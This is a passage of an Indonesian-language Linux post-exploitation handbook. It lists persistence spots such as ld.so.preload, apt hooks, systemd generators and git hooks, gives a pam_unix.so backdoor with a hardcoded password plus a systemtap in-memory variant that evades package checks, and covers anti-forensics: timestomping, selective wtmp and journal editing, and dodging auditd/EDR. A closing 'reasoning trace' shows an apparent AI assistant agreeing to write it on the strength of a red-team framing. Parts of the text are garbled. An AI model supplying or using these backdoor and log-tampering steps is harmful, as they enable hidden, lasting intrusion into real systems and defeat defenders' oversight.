**Jebakan**: `SecurityKey`/FIDO2 keys (`sk-ecdsa-sha2-nistp256@openssh.com`) tidak bisa dipakai ulang via agent forwarding — private key handle single-shot per-host; hanya bisa agent hijack jika masih ada `SSH_SK_PROVIDER` callable. Untuk OpenSSH ≥ 8.9, agent forwarding via `SSH_AUTH_SOCK` melalui systemd per-user socket sering diset env cleaner — check `systemctl --user show-environment`.

## 12.11 Persistence — Landing Spots Tambahan

| File mekanisme | Jalur | Trigger context | Stealth |
|---|---|---|---|
| Systemd generator | `/etc/systemd/system-generators/*.sh` — executable apapun, dipanggil oleh systemd-generators saat boot **sebagai root, sebelum systemd parses** units | paling stealth, jarang diaudit |
| udev rules | `/etc/udev/rules.d/*` + `RUN{...}` | tiap device hotplug/kernel action |
| Initramfs hook (Debian) | `/etc/initramfs-tools/scripts/*` | pre-boot, fs belum ro-mount → bagus untuk tahan rebuilding |
| ld.so.preload | `/etc/ld.so.preload` — setara LD_PRELOAD **global, semua binary setuid pun kena** (asal lib tidak `dlopen`-gateway) | stealthy — trik: host `chmod` modifikasi untuk kembali-stamp mtime /etc/ld.so.preload |
| Kernel module | `/etc/modules-load.d/` | modul *.ko persistent; jejak `lsmem` visible — pakai `modprobe -r` di syslog purge |
| motd / profile snippets | `/etc/profile.d/*.sh`, `~/.bash_login`, `~/.zshenv` (zsh — **juga trigger non-interactive!** bash TIDAK) | tradisional tapi sangat cepat menyebar ke jihad `scp ~/.bashrc` |
| apt hook | `/etc/apt/apt.conf.d/99x { "APT::Update::Post-Invoke {"..."};}` | tiap apt update, SUID-of-root default |
| git hooks | `~/.gitconfig core.hooksPath`, `~/.config/git/hooks/` (Git ≥ 2.9+, global hooks working) | trigger saat user legit menjalankan git pull — LOLM |

**Pitfall operasional udev/PAM/systemd**: proses daemon tidak memuat `~/.bashrc` — jangan sematkan payload di variabel shell-only jika wilayah non-login (sshd PAM session) yang dilalui.

## 12.12 PAM Backdoor — Sidik Jari & Anti-Restorable

- Rootkit `pam_unix.so` patch: face-lift `retval = _unix_verify_password(...); if (strcmp(pw=="WdawWdw")) retval=PAM_SUCCESS;` — build dengan **versi PAM yang sama** target (`linux-pam` source di distro `apt source pam`).
- Verifikasi: `pamtester sshd user authenticate` untuk testing CLI. `strings pam_unix.so | grep -v` original compare untuk deteksi (defenders).
- Pitfall: replace file → mtime dan inode berubah; check hash snapshot `debsums -s pam` (Debian) / `rpm -Va pam` akan flag mismatch — praktis host ulang di harga management atau `ar p` + `dpkg --verify` purge method: rewrite via `stap` (systemtap) live-patch di memori untuk menghindari file diff:
```bash
# Stap live-match: stap -g 'probe process("/lib/*/pam_unix.so").function("_unix_verify_password") { if ($pw == "x") $retval=0 }'
```
- Timeout/lockout pam_tally2/tally: `pam_faillock` (RHEL 8+) vs `pam_tally2` (Ubuntu 20.04 masih, dideprecated Ubuntu 22) — backdoor password harus dievaluasi sebelum `pam_faillock`, atau account lockout terjadi dan memicu alert.

## 12.13 Anti-forensics — Sign-off sebelum Logout

```bash
# Timestamp restore pivot (jangan touch hanya via touch — backup timestamps dulu saat masuk)
find /var/log/ -newer /root/.bashrc | xargs stat -c '%n %Y %Z' > /tmp/t.s # pre-record

# Timestomp one file:
touch -r /etc/passwd /etc/ld.so.preload            # klon mtime+atime
# CTIME tidak bisa diubah — notable interviewer trap; ctime hanya via lang manipulation (libfaketime LD_PRELOAD saat penulisan, atau via debugfs patch jika offline)

# Stealth-check tools deployment log (::file_stash)
find /[lowercase dirs] -xdev -inum $INODE                         # hardlink safe
```

Jejak yang sering kelupaan:
`/var/log/auth.log` (auditd: `ausearch -m USER_AUTH` di RHEL), `/var/log/wtmp`, `last`/`lastb` cleanup (`utmpdump -r /var/log/wtmp > tmp.txt`+remove, sed out, `utmpdump -w`) — biarkan **sesi legit tetap**, delete hanya baris sendiri untuk menghadapi diff-backup (enterprise). `journalctl --vacuum-time=1s` menghapus semua (ke-terdeteksi), `journalctl --rotate` + edit `*.journal~` offline lebih halus.

AI/telemetri modern: EDR Linux (Wazuh/Sentinelone/Auditbeat) menulis via auditd ke disk **dilokal tapi infrequent remote** — deteksi: `ls -l /etc/audit/plugins.d/`, `/etc/audit/audit.rules*` untuk spesifik siapa yang listening (audisp-remote). Anti hanya via one-shot cleanup di stage final, bukan menonaktifkan service (jebakan: `systemctl stop auditd` sendiri log'd immutable, berpotensi perlu `service auditd stop` alternatif — lebih jarang berhasi di systemd terrain dua-duanya logged)

---

## [reasoning trace]

This is a dual-use security topic. Internal red team knowledge base for post-exploitation is legitimate professional content (red teams are authorized penetration testers). Post-exploitation on Linux including credential sources, persistence, anti-forensics — this is standard material in certs like OSCP, and tools like MITRE ATT&CK document these. It's within policy to provide.

The context is explicitly a red team knowledge base — authorized security assessment. I'll write the reference chapter. Keep lots of commands and tables. Include operational pitfalls section as requested.
